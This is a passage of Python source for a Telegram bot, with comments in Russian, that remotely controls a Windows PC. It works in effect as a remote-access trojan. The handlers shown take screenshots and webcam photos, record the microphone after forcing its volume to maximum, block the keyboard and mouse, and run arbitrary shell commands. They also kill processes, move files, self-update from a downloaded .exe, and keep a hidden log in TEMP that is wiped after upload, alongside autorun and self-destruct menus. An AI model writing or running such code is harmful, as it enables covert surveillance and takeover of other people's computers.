    # VK_MEDIA_PLAY_PAUSE = 0xB3
    # Эмулируем нажатие специальной кнопки Play/Pause на клавиатуре.
    # Это работает глобально, даже если плеер свернут или не в фокусе.
    user32 = ctypes.windll.user32
    user32.keybd_event(0xB3, 0, 0, 0)      # Нажали
    user32.keybd_event(0xB3, 0, 2, 0)      # Отпустили (2 = KEYEVENTF_KEYUP)

def close_media():
    players = detect_active_player()
    if not players:
        # Если psutil не нашел, пробуем убить "вслепую" самые популярные, на всякий случай
        force_kill_list = ["Video.UI.exe", "Microsoft.Media.Player.exe", "wmplayer.exe", "vlc.exe"]
        for p in force_kill_list:
            subprocess.Popen(f'taskkill /IM {p} /F', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return ["(принудительно)"]
        
    for p in players:
        # /F - принудительно, /T - убить дерево процессов (важно для UWP)
        subprocess.Popen(f'taskkill /IM {p} /F /T', shell=True)
    return players

# ================================
# ОСНОВНОЙ ОБРАБОТЧИК СООБЩЕНИЙ
# ================================

@bot.message_handler(content_types=["text","document","video","audio","photo"])
def get_text_messages(message):
    if message.from_user.id != my_id:
        return
        
    if message.text == "/start":
        clear_state() # Сброс всех ожиданий
        bot.send_message(my_id, "🏠 Главное меню (Перезапуск)", reply_markup=menu_keyboard)
        return

    # =========================================================
    # 1. 🛡 ГЛОБАЛЬНЫЙ СБРОС (АБСОЛЮТНЫЙ ПРИОРИТЕТ)
    # =========================================================
    # Если пришел ТЕКСТ, проверяем, не является ли он кнопкой меню.
    # Это сработает, даже если бот ждет цифру для калькулятора.
    if message.content_type == 'text':
        # Список команд, которые должны сбрасывать "зависание"
        reset_commands = [
            '⏪Назад⏪', 
            '📂Файлы и процессы', 
            '❇️Дополнительно', 
            '🖱Управление мышкой',
            '📷Быстрый скриншот', 
            '🖼Полный скриншот', 
            '📹Фото вебкамеры',
            '📩Отправка уведомления', 
            '❗️Информация',
            '💀 Управление ботом'
        ]
        
        if message.text in reset_commands:
            # СБРОС ВСЕХ СОСТОЯНИЙ И ЗАДВОЕНИЙ
            bot.clear_step_handler_by_chat_id(message.chat.id)
            User.state = None
            User.wait_calc_value = False
            User.wait_media = False
            User.wait_volume = False
            # Если это кнопка "Назад" — просто выходим в главное меню
            if message.text == '⏪Назад⏪':
                bot.send_message(my_id, "🏠 Главное меню", reply_markup=menu_keyboard)
                return
            # Если другая кнопка меню — код пойдет дальше и выполнит её в блоке "ТЕКСТОВЫЕ КОМАНДЫ"

    # =========================================================
    # 2. 📂 ОБРАБОТКА ФАЙЛОВ (ВИДЕО, АУДИО, ДОКУМЕНТЫ, ФОТО)
    # =========================================================
    if message.content_type in ['document', 'video', 'audio', 'photo']:
        try:
            bot.send_message(my_id, "⏳ Анализирую файл...")
            
            file_info = None
            filename = None
            
            # --- ВИДЕО ---
            if message.video:
                file_info = bot.get_file(message.video.file_id)
                # У видео в Telegram API часто нет имени, генерируем сами
                filename = f"video_{random.randint(1000,9999)}.mp4"

            # --- АУДИО (МУЗЫКА) ---
            elif message.audio:
                file_info = bot.get_file(message.audio.file_id)
                # Пробуем взять имя автора и трека
                if message.audio.file_name:
                    filename = message.audio.file_name
                elif message.audio.performer and message.audio.title:
                    filename = f"{message.audio.performer} - {message.audio.title}.mp3"
                else:
                    filename = f"audio_{random.randint(1000,9999)}.mp3"

            # --- ДОКУМЕНТЫ ---
            elif message.document:
                file_info = bot.get_file(message.document.file_id)
                filename = message.document.file_name
                
                # 🥷 ИНТЕГРАЦИЯ WIREGUARD
                if filename.endswith(".conf"):
                    bot.send_message(my_id, "⏳ Скачиваю WG конфиг для анализа...")
                    downloaded_file = bot.download_file(file_info.file_path)
                    conf_text = downloaded_file.decode('utf-8')
                    
                    # Сохраняем текст конфига во временную память User (чтобы забрать в callback)
                    User.last_wg_conf = conf_text 
                    
                    kb = types.InlineKeyboardMarkup()
                    kb.add(
                        types.InlineKeyboardButton("🚀 Протестировать и Применить", callback_data="wg_test_apply"),
                        types.InlineKeyboardButton("❌ Отмена", callback_data="confirm_cancel")
                    )
                    bot.send_message(my_id, f"🛡 Обнаружен конфиг WireGuard: `{filename}`\nЗапустить изолированный тест соединения?", reply_markup=kb, parse_mode="Markdown")
                    return # Выходим, чтобы не сохранять конфиг как обычный файл

            # --- ФОТО ---
            elif message.photo:
                # Берем последнее фото (лучшее качество)
                file_info = bot.get_file(message.photo[-1].file_id)
                ext = file_info.file_path.split('.')[-1]
                filename = f"photo_{random.randint(1000,9999)}.{ext}"

            # --- ПРОВЕРКА РАЗМЕРА ---
            # Лимит ботов ~20МБ (20 * 1024 * 1024 байт)
            if file_info.file_size and file_info.file_size > 20971520:
                bot.send_message(my_id, f"❌ Файл слишком большой ({round(file_info.file_size/1024/1024, 1)} MB).\nБоты Telegram не могут скачивать файлы > 20 MB.")
                return

            # --- СКАЧИВАНИЕ ---
            bot.send_message(my_id, "⏳ Загрузка началась...")
            downloaded_file = bot.download_file(file_info.file_path)

            # --- УМНОЕ ПЕРЕИМЕНОВАНИЕ (если есть подпись/caption) ---
            if message.caption:
                # Оставляем только безопасные символы
                safe_caption = "".join([c for c in message.caption if c.isalpha() or c.isdigit() or c in " .-_"])
                if safe_caption:
                    current_ext = filename.split('.')[-1]
                    # Если юзер не написал расширение в подписи, добавляем его
                    if not safe_caption.endswith(current_ext):
                        safe_caption += f".{current_ext}"
                    filename = safe_caption

            # --- СОХРАНЕНИЕ НА ДИСК ---
            save_path = os.path.abspath(filename)
            with open(save_path, 'wb') as f:
                f.write(downloaded_file)

            bot.send_message(my_id, f"✅ Файл сохранён!\n📂 {save_path}")
            return

        except Exception as e:
            bot.send_message(my_id, f"❌ Ошибка при скачивании файла: {e}")
            print(f"File Error: {e}")
            return

    # =========================================================
    # 3. ОБРАБОТКА СОСТОЯНИЙ (ЕСЛИ ЭТО НЕ ФАЙЛ И НЕ СБРОС)
    # =========================================================
    if User.state == 'calc_value':
        calc_value_process(message)
        return

    if User.state == 'volume':
        volume_process(message)
        return

    if User.state == 'media_path':
        media_select_process(message)
        return
        
    if User.state == 'mouse_curs': 
        mousecurs_settings(message)
        return

    # =========================================================
    # 4. ТЕКСТОВЫЕ КОМАНДЫ (МЕНЮ)
    # =========================================================
    if message.text == "📷Быстрый скриншот":
        try:
            get_screenshot()
            with open("screen_with_mouse.png", "rb") as f:
                bot.send_photo(my_id, f)
            if os.path.exists("screen.png"): os.remove("screen.png")
            if os.path.exists("screen_with_mouse.png"): os.remove("screen_with_mouse.png")
        except Exception as e:
            bot.send_message(my_id, f"Ошибка скриншота: {e}")

    elif message.text == "🖼Полный скриншот":
        try:
            get_screenshot()
            with open("screen_with_mouse.png", "rb") as f:
                bot.send_document(my_id, f)
            if os.path.exists("screen.png"): os.remove("screen.png")
            if os.path.exists("screen_with_mouse.png"): os.remove("screen_with_mouse.png")
        except Exception as e:
            bot.send_message(my_id, f"Ошибка: {e}")

    elif message.text == "📹Фото вебкамеры":
        bot.send_message(my_id, "📸 Подключаюсь к камере...")
        
        # 1. Пробуем стандартный метод
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            # Если все ок - отправляем сразу
            cv2.imwrite('webcam.png', frame)
            with open("webcam.png", "rb") as f:
                bot.send_photo(my_id, f)
            os.remove("webcam.png")
        else:
            # 2. Если не вышло - предлагаем ремонт
            kb = types.InlineKeyboardMarkup()
            kb.add(
                types.InlineKeyboardButton("🛠 Попробовать починить", callback_data="fix_cam_yes"),
                types.InlineKeyboardButton("❌ Отмена", callback_data="confirm_cancel")
            )
            bot.send_message(
                my_id, 
                "⚠️ Ошибка: Камера не отвечает или занята другим приложением.\nПопробовать перезапустить устройство захвата программно?", 
                reply_markup=kb
            )

    elif message.text == "🖱Управление мышкой":
        bot.send_message(my_id, "🖱Управление мышкой", reply_markup=mouse_keyboard)
        bot.register_next_step_handler(message, mouse_process)

    elif message.text == "📂Файлы и процессы":
        bot.send_message(my_id, "📂Файлы и процессы", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)

    elif message.text == "❇️Дополнительно":
        bot.send_message(my_id, "❇️Дополнительно", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)

    elif message.text == "📩Отправка уведомления":
        bot.send_message(my_id, "Укажите текст уведомления:")
        bot.register_next_step_handler(message, messaga_process)

    elif message.text == "❗️Информация":
        bot.send_message(my_id, info_msg, parse_mode="markdown")

    elif message.text == "🎙Запись звука":
        bot.send_message(my_id, "🎙 Студия звукозаписи.\nНажмите '🔴 НАЧАТЬ', чтобы записать микрофон.", reply_markup=audio_keyboard)
        bot.register_next_step_handler(message, audio_process)

    # Эта проверка на всякий случай, хотя верхний блок уже должен был её поймать
    elif message.text == "⏪Назад⏪":
        back(message)


# ================================
# ЛОГИКА ПОДМЕНЮ
# ================================

def addons_process(message):
    if message.from_user.id != my_id: return

    if message.text == "⛔️Выключить компьютер":
        kb = types.InlineKeyboardMarkup()
        kb.add(
            types.InlineKeyboardButton("❌ Отмена", callback_data="confirm_cancel"),
            types.InlineKeyboardButton("⛔️ Подтвердить", callback_data="confirm_shutdown")
        )
        bot.send_message(my_id, "⚠️ ВНИМАНИЕ!!!\nВы действительно хотите ВЫКЛЮЧИТЬ компьютер?", reply_markup=kb)

    elif message.text == "♻️Перезагрузить компьютер":
        kb = types.InlineKeyboardMarkup()
        kb.add(
            types.InlineKeyboardButton("❌ Отмена", callback_data="confirm_cancel"),
            types.InlineKeyboardButton("♻️ Подтвердить", callback_data="confirm_reboot")
        )
        bot.send_message(my_id, "⚠️ ВНИМАНИЕ!!!\nВы действительно хотите ПЕРЕЗАГРУЗИТЬ компьютер?", reply_markup=kb)

    elif message.text == "🧮Калькулятор":
        kb = types.InlineKeyboardMarkup()
        kb.add(
            types.InlineKeyboardButton("✏️ Задать число", callback_data="calc_set"),
            types.InlineKeyboardButton("▶️ Запустить", callback_data="calc_run")
        )
        cur = User.calc_value if User.calc_value is not None else 'не задано'
        bot.send_message(my_id, f"🧮 Меню калькулятора\nТекущее число: {cur}", reply_markup=kb)

    elif message.text == "🔗Перейти по ссылке":
        bot.send_message(my_id, "Укажите ссылку: ")
        bot.register_next_step_handler(message, web_process)

    elif message.text == "✅Выполнить команду":
        bot.send_message(my_id, "Укажите консольную команду: ")
        bot.register_next_step_handler(message, cmd_process)

    elif message.text == '🖥О компьютере':
        bot.send_message(my_id, "⏳ Собираю данные о системе...")

        try:
            # === 1. ПОЛУЧЕНИЕ IP (КАСКАДНЫЙ МЕТОД) ===
            ip_info = "Не удалось определить"
            
            try:
                ip_info = requests.get('https://api.ipify.org', proxies={}, timeout=3).text
            except:
                try:
                    response = requests.get('http://ipwho.is', proxies={}, timeout=3).json()
                    ip_info = response.get('ip', 'Ошибка API')
                except:
                    try:
                        ip_info = f"Local: {socket.gethostbyname(socket.gethostname())}"
                    except:
                        ip_info = "Нет сети"

            # === 2. СИСТЕМНЫЕ ДАННЫЕ ===
            # Пользователь
            try:
                uname = os.getlogin()
            except:
                uname = os.environ.get('USERNAME', 'Unknown')
            
            # Система
            sys_os = platform.platform()
            processor = platform.processor()
            node_name = platform.node()

            # Аптайм (Время работы)
            boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.datetime.now() - boot_time
            uptime_str = str(uptime).split('.')[0] # 1 day, 5:30:15

            # Нагрузка (CPU и RAM)
            # interval=0.5 обязателен для корректного замера CPU
            cpu_usage = psutil.cpu_percent(interval=0.5) 
            ram = psutil.virtual_memory()
            ram_total = round(ram.total / (1024**3), 1)
            ram_used = round(ram.used / (1024**3), 1)
            ram_percent = ram.percent

            # === 3. ФОРМИРОВАНИЕ СООБЩЕНИЯ ===
            msg = f"""
💻 *СИСТЕМНАЯ ИНФОРМАЦИЯ*

👤 *Пользователь:* `{uname}`
📛 *Имя ПК:* `{node_name}`
🌐 *IP:* `{ip_info}`

🤖 *ОС:* {sys_os}
🧠 *Процессор:* {processor}
🕒 *Аптайм:* {uptime_str}

📊 *Состояние ресурсов:*
• *CPU:* {cpu_usage}%
• *RAM:* {ram_percent}% ({ram_used}GB / {ram_total}GB)
"""
            bot.send_message(my_id, msg, parse_mode="markdown")

        except Exception as e:
            bot.send_message(my_id, f"❌ Ошибка сбора информации: {e}")

        # Возвращаем клавиатуру и ожидание ввода
        bot.send_message(my_id, "❇️ Дополнительно", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
    
    elif message.text == "💀 Управление ботом":
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("🛑 Остановить скрипт", callback_data="ask_stop"))
        kb.add(types.InlineKeyboardButton("🗑 Удалить из автозагрузки", callback_data="ask_autorun"))
        kb.add(types.InlineKeyboardButton("💣 САМОУНИЧТОЖЕНИЕ", callback_data="ask_uninstall"))
        bot.send_message(my_id, "⚠️ Меню опасных действий:", reply_markup=kb)

    # Внутри addons_process
    elif message.text == "⌨️ Горячие клавиши":
        bot.send_message(my_id, "⌨️ Меню горячих клавиш", reply_markup=hotkeys_keyboard)
        bot.register_next_step_handler(message, hotkeys_process)
    
    elif message.text == "🛠 Менеджер ввода":
        # Формируем статусное сообщение
        status = f"""🛠 *Менеджер устройств ввода*
Статус:
⌨️ Клавиатура: {'⛔️ ЗАБЛОКИРОВАНА' if InputManager.keyboard_blocked else '✅ Активна'}
🖱 Мышь (нажатия): {'⛔️ ЗАБЛОКИРОВАНА' if InputManager.mouse_blocked else '✅ Активна'}
🔄 Инверсия: {'🙃 Да' if InputManager.mouse_swapped else '🙂 Нет'}

_Примечание: Системные сочетания (Ctrl+Alt+Del) не блокируются без прав админа._
"""
        bot.send_message(my_id, status, reply_markup=input_manager_keyboard, parse_mode="Markdown")
        bot.register_next_step_handler(message, input_manager_process)
    
    elif message.text == "🔄 Обновить бота":
        bot.send_message(my_id, "⚠️ Отправьте ПРЯМУЮ ссылку на скачивание нового .exe файла.\n(Файл должен быть < 2 ГБ, ссылка должна заканчиваться на .exe или вести напрямую на файл)")
        bot.register_next_step_handler(message, update_bot_step_1)
        
    elif message.text == "📄 Выгрузить логи":
        bot.send_message(my_id, "⏳ Формирую отчет по логам...")
        
        # Берем путь прямо из нашего скрытого логгера
        log_path = stealth_logger.filepath
        
        if os.path.exists(log_path) and os.path.getsize(log_path) > 0:
            try:
                with open(log_path, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                    preview = "".join(lines[-15:]) if lines else "Логи пусты."
                
                bot.send_message(my_id, f"📝 *Последние события (Console):* \n```text\n{preview}\n```", parse_mode="Markdown")
                
                with open(log_path, "rb") as f:
                    bot.send_document(my_id, f, caption="Полный лог (папка TEMP)")
                
                # === ОЧИСТКА ФАЙЛА (Стираем данные, не удаляя сам файл) ===
                stealth_logger.clear()
                bot.send_message(my_id, "🗑 Логи успешно выгружены и стерты с ПК.")
                
            except Exception as e:
                bot.send_message(my_id, f"❌ Ошибка выгрузки логов: {e}")
        else:
            bot.send_message(my_id, "ℹ️ Файл логов пока пуст.")
            
        bot.send_message(my_id, "❇️ Дополнительно", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)

def input_manager_process(message):
    if message.from_user.id != my_id:
        return

    # 1. Выход
    if message.text == "⏪Назад⏪":
        bot.send_message(my_id, "Возврат в Дополнительно", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
        return

    # 2. Логика
    msg = ""
    
    if message.text == "⌨️ Блок. Клавиатуры":
        if InputManager.keyboard_blocked:
            unblock_keyboard_func()
            msg = "⌨️ Клавиатура РАЗБЛОКИРОВАНА"
        else:
            block_keyboard_func()
            msg = "⌨️ Клавиатура ЗАБЛОКИРОВАНА (Физическая)"

    elif message.text == "🖱 Блок. Мыши":
        if InputManager.mouse_blocked:
            unblock_mouse_func()
            msg = "🖱 Мышь РАЗБЛОКИРОВАНА"
        else:
            block_mouse_func()
            msg = "🖱 Мышь ЗАБЛОКИРОВАНА (Физическая)"

    elif message.text == "🔄 Инверсия ЛКМ/ПКМ":
        if InputManager.mouse_swapped:
            swap_mouse_func(False)
            msg = "🙂 Кнопки мыши: Стандарт"
        else:
            swap_mouse_func(True)
            msg = "🙃 Кнопки мыши: Инвертированы (ЛКМ <-> ПКМ)"

    elif message.text == "🔓 РАЗБЛОКИРОВАТЬ ВСЁ":
        unblock_keyboard_func()
        unblock_mouse_func()
        swap_mouse_func(False)
        msg = "✅ Все ограничения сняты"

    # 3. Обновляем статус и клавиатуру
    if msg:
        bot.send_message(my_id, msg)
        
    # Повторная отправка меню со статусом (опционально, или просто ждем ввода)
    status = f"Состояние:\nKb: {InputManager.keyboard_blocked} | Ms: {InputManager.mouse_blocked} | Swap: {InputManager.mouse_swapped}"
    bot.send_message(my_id, status, reply_markup=input_manager_keyboard)
    bot.register_next_step_handler(message, input_manager_process)

def files_process(message):
    if message.from_user.id != my_id: return

    if message.text == "🎬 Медиа плеер":
        bot.send_message(my_id, "Укажите путь к видео или аудио файлу:")
        User.wait_media = True
        User.state = 'media_path'
        # Сброс остальных состояний
        User.wait_volume = False
        bot.register_next_step_handler(message, media_select_process)

    elif message.text == "⚙️ Процессы (Окна)":
        bot.send_message(my_id, "⏳ Сканирую рабочий стол пользователя...")
        try:
            user_apps = get_active_user_apps()
            
            if user_apps:
                # Разбиваем на сообщения, если открыто очень много окон (лимит Telegram)
                response = "🖥 **Активные приложения пользователя:**\n\n"
                response += "\n\n".join(user_apps)
                
                if len(response) > 4000:
                    for x in range(0, len(response), 4000):
                        bot.send_message(my_id, response[x:x+4000], parse_mode="Markdown")
                else:
                    bot.send_message(my_id, response, parse_mode="Markdown")
            else:
                bot.send_message(my_id, "ℹ️ На рабочем столе нет открытых окон.")
                
        except Exception as e:
            bot.send_message(my_id, f"❌ Ошибка сканирования окон: {e}")
            
        bot.register_next_step_handler(message, files_process)

    elif message.text == "🔊Громкость":
        current = get_volume()
        bot.send_message(my_id, f"🔊 Текущая громкость: {current}%\n\nВведите новое значение (0–100):")
        User.wait_volume = True
        User.state = 'volume'
        # Регистрация не требуется, перехватит основной handler по state
    
    elif message.text == "❌Замочить процесс":
        bot.send_message(my_id, "Укажите ТОЧНОЕ имя процесса (например chrome.exe):")
        bot.register_next_step_handler(message, kill_process)

    elif message.text == "✔️Запустить":
        bot.send_message(my_id, "Укажите путь до файла: ")
        bot.register_next_step_handler(message, start_process)

    elif message.text == "⬇️Скачать файл":
        bot.send_message(my_id, "Укажите путь до файла на ПК: ")
        bot.register_next_step_handler(message, downfile_process)

    elif message.text == "⬆️Загрузить файл":
        bot.send_message(my_id, "Отправьте необходимый файл")
        bot.register_next_step_handler(message, uploadfile_process)

    elif message.text == "🔗Загрузить по ссылке":
        bot.send_message(my_id, "Укажите прямую ссылку скачивания:")
        bot.register_next_step_handler(message, uploadurl_process)

    elif message.text == "⏪Назад⏪":
        back(message)

# ================================
# СПЕЦИФИЧЕСКИЕ ОБРАБОТЧИКИ (ШАГИ)
# ================================

def mouse_process(message):
    if message.from_user.id != my_id:
        return
    
    # 1. Аварийный выход и смена размаха
    if message.text == "⏪Назад⏪":
        # Сбрасываем клавиатуру на главное меню
        back_to_main(message)
        return

    if message.text == "📏 Размах": # Текст должен совпадать с кнопкой!
        bot.send_message(my_id, f"Текущий шаг курсора: {User.curs}px\nВведите новое число:")
        User.state = 'mouse_curs'
        return
        
    # 2. Логика движения и кликов
    try:
        # Получаем текущую позицию
        x, y = mouse.get_position()
        
        # Движение
        if message.text == "⬆️": 
            mouse.move(x, y - User.curs)
            screen_process(message) # Обновляем скриншот после движения
            
        elif message.text == "⬇️": 
            mouse.move(x, y + User.curs)
            screen_process(message)
            
        elif message.text == "⬅️": 
            mouse.move(x - User.curs, y)
            screen_process(message)
            
        elif message.text == "➡️": 
            mouse.move(x + User.curs, y)
            screen_process(message)
            
        # Клики (Скриншот обновлять не обязательно, но можно, если хотите видеть результат клика)
        elif message.text == "🖱 ЛКМ":
            mouse.click(button='left')
            bot.send_message(my_id, "✅ Клик ЛКМ")
            
        elif message.text == "🖱 ПКМ":
            mouse.click(button='right')
            bot.send_message(my_id, "✅ Клик ПКМ")
            
        elif message.text == "🖱 2xЛКМ":
            mouse.double_click(button='left')
            bot.send_message(my_id, "✅ Двойной клик")
            
    except Exception as e:
        bot.send_message(my_id, f"Ошибка мыши: {e}")
        # Если ошибка, не выкидываем из меню, а даем попробовать снова
        bot.register_next_step_handler(message, mouse_process)

    # 3. Оставляем пользователя в режиме мыши (кроме случая "Назад", который обработан выше)
    # В screen_process уже есть register_next_step_handler, но для кликов нужно добавить здесь:
    if message.text in ["🖱 ЛКМ", "🖱 ПКМ", "🖱 2xЛКМ"]:
        bot.register_next_step_handler(message, mouse_process)

def mousecurs_settings(message):
    if message.text.isdigit():
        User.curs = int(message.text)
        User.state = None
        bot.send_message(my_id, f"✅ Размах изменён: {User.curs}px", reply_markup=mouse_keyboard)
        bot.register_next_step_handler(message, mouse_process)
    else:
        bot.send_message(my_id, "Пожалуйста, введите число.")

def block_keyboard_func():
    if InputManager.keyboard_blocked: return
    # suppress=True блокирует передачу клавиш в систему
    InputManager.k_listener = pynput_k.Listener(suppress=True)
    InputManager.k_listener.start()
    InputManager.keyboard_blocked = True

def unblock_keyboard_func():
    if not InputManager.keyboard_blocked: return
    if InputManager.k_listener:
        InputManager.k_listener.stop()
    InputManager.keyboard_blocked = False

def block_mouse_func():
    if InputManager.mouse_blocked: return
    # Блокируем клики и скролл, но движение лучше оставить (или тоже блокировать)
    # suppress=True блокирует все
    InputManager.m_listener = pynput_m.Listener(suppress=True)
    InputManager.m_listener.start()
    InputManager.mouse_blocked = True

def unblock_mouse_func():
    if not InputManager.mouse_blocked: return
    if InputManager.m_listener:
        InputManager.m_listener.stop()
    InputManager.mouse_blocked = False

def swap_mouse_func(swap=True):
    # 1 = поменять местами, 0 = вернуть как было
    ctypes.windll.user32.SwapMouseButton(1 if swap else 0)
    InputManager.mouse_swapped = swap

def find_process_name(search_term):
    found = []
    search_term = search_term.lower()
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            # Ищем совпадение в имени
            if proc.info['name'] and search_term in proc.info['name'].lower():
                found.append(proc.info['name'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return list(set(found))

def screen_process(message):
    try:
        get_screenshot()
        with open("screen_with_mouse.png", "rb") as f:
            bot.send_photo(my_id, f)
        if os.path.exists("screen.png"): os.remove("screen.png")
        if os.path.exists("screen_with_mouse.png"): os.remove("screen_with_mouse.png")
        # Перерегистрируем обработчик мыши, чтобы кнопки работали дальше
        bot.register_next_step_handler(message, mouse_process)
    except:
        bot.send_message(my_id, "Ошибка получения экрана")

def volume_process(message):
    # Аварийный выход
    if message.text == "⏪Назад⏪":
        back_to_files(message)
        return

    if message.from_user.id == my_id:
        if message.text.isdigit():
            vol = int(message.text)
            
            # Устанавливаем громкость
            set_volume(vol)
            
            # Даем Windows 0.1 сек на применение настроек
            time.sleep(0.1)
            
            # Считываем РЕАЛЬНОЕ значение, чтобы убедиться
            real_vol = get_volume()
            
            bot.send_message(my_id, f"✅ Громкость изменена: {real_vol}%", reply_markup=files_keyboard)
            
            # Сброс состояния
            User.state = None
            User.wait_volume = False
        else:
            bot.send_message(my_id, "❌ Введите число от 0 до 100:")
            # Оставляем в режиме ввода
            bot.register_next_step_handler(message, volume_process)

def calc_value_process(message):
    if message.from_user.id == my_id and User.state == 'calc_value':
        User.calc_value = message.text
        User.wait_calc_value = False
        User.state = None
        bot.send_message(my_id, f"✅ Число сохранено: {User.calc_value}", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)

def media_select_process(message):
    if message.text == "⏪Назад⏪":
        back_to_files(message)
        return

    path = message.text.replace('"', '')
    
    if os.path.exists(path):
        User.last_media_path = path
        User.state = None # Сбрасываем ожидание пути
        
        # Предлагаем варианты запуска
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("🎬 Оконный", callback_data="media_window"),
               types.InlineKeyboardButton("🖥 Полный экран", callback_data="media_full"))
        
        bot.send_message(my_id, f"✅ Файл найден: {path}\nКак открыть?", reply_markup=kb)
        
        # ВАЖНО: После отправки инлайн-кнопок мы должны вернуть пользователя 
        # в контекст меню Файлов, чтобы кнопки снизу работали!
        bot.register_next_step_handler(message, files_process)
    else:
        bot.send_message(my_id, "❌ Файл не найден. Попробуйте еще раз или 'Назад':")
        bot.register_next_step_handler(message, media_select_process)


# ================================
# ПРОСТЫЕ ФУНКЦИИ (ВЫЗЫВАЮТСЯ REGISTER_NEXT_STEP)
# ================================

def set_mic_volume(val):
    try:
        comtypes.CoInitialize()
        
        devices = AudioUtilities.GetDeviceEnumerator()
        interface = devices.GetDefaultAudioEndpoint(1, 1) # Capture
        volume = interface.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_interface = cast(volume, POINTER(IAudioEndpointVolume))
        
        scalar = val / 100.0
        volume_interface.SetMasterVolumeLevelScalar(scalar, None)
    except Exception:
        pass

def record_audio_thread():
    """Фоновая функция, которая читает данные с микрофона"""
    global recording_data, recording_flag
    
    # Настройки качества: 24kHz, Mono (Экономит место, качество ок для голоса)
    fs = 24000 
    
    # Callback функция, которую вызывает sounddevice
    def callback(indata, frames, time, status):
        if recording_flag:
            recording_data.append(indata.copy())
            
    # Запускаем стрим
    with sd.InputStream(samplerate=fs, channels=1, callback=callback):
        while recording_flag:
            sd.sleep(100)

def start_recording():
    global recording_flag, recording_data, recording_thread
    recording_data = [] # Очищаем буфер
    recording_flag = True
    
    # Выкручиваем микрофон на 100%
    set_mic_volume(100)
    
    recording_thread = threading.Thread(target=record_audio_thread)
    recording_thread.start()

def stop_and_save():
    global recording_flag, recording_filename
    recording_flag = False
    
    if recording_thread:
        recording_thread.join()
    
    # Собираем файл из кусков
    if recording_data:
        # Объединяем массив numpy
        my_recording = np.concatenate(recording_data, axis=0)
        # Сохраняем в WAV
        write(recording_filename, 24000, my_recording)
        return True
    return False

def back(message):
    User.state = None
    bot.send_message(my_id, "Вы в главном меню", reply_markup=menu_keyboard)

def kill_process(message):
    if message.from_user.id != my_id: return
    
    # Аварийный выход
    if message.text == "⏪Назад⏪":
        back(message)
        return

    proc_name = message.text.strip()
    
    # 1. Авто-добавление .exe (удобство)
    if not proc_name.endswith(".exe"):
        proc_name += ".exe"

    bot.send_message(my_id, f"🔫 Пытаюсь убить: {proc_name}...")

    # 2. Используем subprocess вместо os.system, чтобы видеть ошибки
    # /F - Принудительно
    # /T - Убить дочерние процессы (важно для Chrome, Discord и т.д.)
    cmd = f'taskkill /IM "{proc_name}" /F /T'
    
    try:
        # Запускаем и ловим ответ системы
        # encoding='cp866' нужен, чтобы корректно читать русский текст из консоли Windows
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='cp866', errors='ignore')
        
        if result.returncode == 0:
            bot.send_message(my_id, f"✅ УСПЕХ!\n{result.stdout}")
        else:
            # Если Windows вернула ошибку, показываем её
            err_msg = result.stderr.strip() or result.stdout.strip()
            bot.send_message(my_id, f"❌ НЕ ВЫШЛО.\nОтвет Windows:\n{err_msg}")
            
            if "Отказано в доступе" in err_msg:
                bot.send_message(my_id, "💡 Подсказка: Запустите бота от имени Администратора!")

    except Exception as e:
        bot.send_message(my_id, f"❌ Ошибка выполнения: {e}")

    # Возврат в меню (без регистрации следующего шага, чтобы не застрять)
    bot.send_message(my_id, "Меню файлов", reply_markup=files_keyboard)

def hotkeys_process(message):
    if message.from_user.id != my_id:
        return

    # 1. Аварийный выход
    if message.text == "⏪Назад⏪":
        bot.send_message(my_id, "Возврат в меню Дополнительно", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process) # Возвращаем управление
        return

    # 2. Обработка кнопок
    if message.text == "💥 Alt + F4":
        press_hotkey("alt_f4")
        bot.send_message(my_id, "Нажато Alt + F4")
        
    elif message.text == "📉 Свернуть всё":
        press_hotkey("win_d")
        bot.send_message(my_id, "Окна свернуты/развернуты")
        
    elif message.text == "✅ Enter":
        press_hotkey("enter")
        bot.send_message(my_id, "Нажат Enter")

    elif message.text == "📊 Диспетчер задач":
        press_hotkey("taskmgr")
        bot.send_message(my_id, "Диспетчер задач открыт")
        
    elif message.text == "⏯ Пробел":
        press_hotkey("space")
        bot.send_message(my_id, "Нажат Пробел (Пауза/Пуск)")

    elif message.text == "🔲 Клавиша F":
        press_hotkey("f")
        bot.send_message(my_id, "Нажата F (Медиа Fullscreen)")

    elif message.text == "🖥 Клавиша F11":
        press_hotkey("f11")
        bot.send_message(my_id, "Нажата F11 (Фулскрин окна)")
    
    elif message.text == "❌ Клавиша Esc":
        press_hotkey("esc")
        bot.send_message(my_id, "Нажата Esc (Выход из полноэкранного режима)")
        
    # 3. Оставляем пользователя в этом меню, чтобы мог нажать еще что-то
    bot.register_next_step_handler(message, hotkeys_process)


def start_process(message):
    if message.text == "⏪Назад⏪":
        back_to_files(message)
        return

    # Если пользователь ввел путь
    path = message.text.replace('"', '') # Убираем кавычки
    bot.send_message(my_id, f"🚀 Запускаю: {path}")
    try:
        os.startfile(path)
    except Exception as e:
        bot.send_message(my_id, f"Ошибка запуска: {e}")
    
    # ВАЖНО: Возвращаем управление в меню Файлов
    bot.send_message(my_id, "📂 Меню файлов", reply_markup=files_keyboard)
    bot.register_next_step_handler(message, files_process)

def web_process(message):
    # 1. Проверка на кнопку "Назад"
    if message.text == "⏪Назад⏪":
        back_to_addons(message)
        return

    # 2. Обработка и валидация ссылки
    url = message.text.strip()
    
    # Если ввели ерунду без точки (и это не localhost), просим повторить
    if "." not in url and "localhost" not in url:
